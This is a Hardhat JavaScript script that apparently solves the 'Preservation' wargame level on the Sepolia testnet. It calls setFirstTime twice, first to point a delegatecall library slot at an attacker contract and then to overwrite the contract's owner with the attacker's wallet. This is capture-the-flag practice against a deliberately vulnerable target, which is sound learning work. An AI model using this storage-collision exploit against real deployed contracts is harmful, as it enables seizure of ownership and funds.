const {ethers} = require('hardhat');

const PRIVATE_KEY = process.env.PRIVATE_KEY;
const SECOND_PRIVATE_KEY = process.env.SECOND_PRIVATE_KEY;
const ALCHEMY_SEPOLIA_URL = process.env.ALCHEMY_SEPOLIA_URL;

const provider = new ethers.providers.JsonRpcProvider(ALCHEMY_SEPOLIA_URL);
const wallet1 = new ethers.Wallet(PRIVATE_KEY, provider);
const wallet2 = new ethers.Wallet(SECOND_PRIVATE_KEY, provider);

const Instance_Address = '0x08fb820B8F796FCE52A10A27a26fE4C40FcFcDd3';
Instance_Json = require('../artifacts/contracts/16_Preservation.sol/Preservation.json');
const Instance_Abi = Instance_Json.abi;
const Instance = new ethers.Contract(Instance_Address, Instance_Abi, wallet1);
// const Instance = new ethers.Contract(Instance_Address, Instance_Abi);


const Attack_Address = '0x0b051cE2F4B395D478193B7227b3Fc4e1Ca31bC4';
Attack_Json = require('../artifacts/contracts/16_Preservation.sol/LibraryContract.json');
const Attack_Abi = Attack_Json.abi;
const Attack = new ethers.Contract(Attack_Address, Attack_Abi, wallet1);


//wallet1_address = 0x8235753B562109C0efD4C2dA4E4138aed10Fa397
//attack_contract_address = 0x6c7FDC2f7F6BE6603cB49ba211FA8cc68da32497
const main = async () => {
    let owner = await Instance.owner();
    console.log("owner: ", owner);
    let slot0 = await Instance.timeZone1Library();
    console.log("slot0: ", slot0);
    const tx1 = await Instance.setFirstTime(Attack_Address);
    await tx1.wait(1);
    slot0 = await Instance.timeZone1Library();
    console.log("slot0: ", slot0);
    const tx2 = await Instance.setFirstTime(wallet1.address);
    await tx2.wait(1);
    owner = await Instance.owner();
    console.log("owner: ", owner);


}

main()
    .then(() => process.exit(0))
    .catch(error => {
        console.error(error);
        process.exit(1);
    });
